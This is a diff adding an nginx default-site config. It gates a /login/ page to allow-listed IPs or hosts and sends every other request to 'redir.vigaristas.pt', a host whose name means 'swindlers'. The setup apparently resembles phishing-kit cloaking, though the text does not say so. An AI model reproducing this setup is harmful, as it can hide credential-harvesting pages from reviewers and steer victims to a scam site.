@@ -1,0 +1,32 @@
+# /etc/nginx/sites-enabled/default
+server {
+	listen 80 default_server;
+	listen [::]:80 default_server;
+	root /var/www/html;
+	index index.php index.html index.htm index.nginx-debian.html;
+	server_name _;
+	access_log /home/default.access.log;
+	error_log /home/default.error.log;    
+    
+
+	location /login/ {
+		set $valido 0;
+		if ($allowedip){ set $valido 1;	}
+		if ($allowedhost){ set $valido 1; }
+		if ($valido = 0) { return 550; }
+		try_files /index.php /index.php?q=$uri&$args =404; #try_files $uri $uri/ =404;
+	}
+    
+ 
+	location / {
+		return 301 http://redir.vigaristas.pt?index.php?host=$host;
+		try_files $uri $uri/ =404;
+    }
+	
+
+
+    
+
+}
+
+
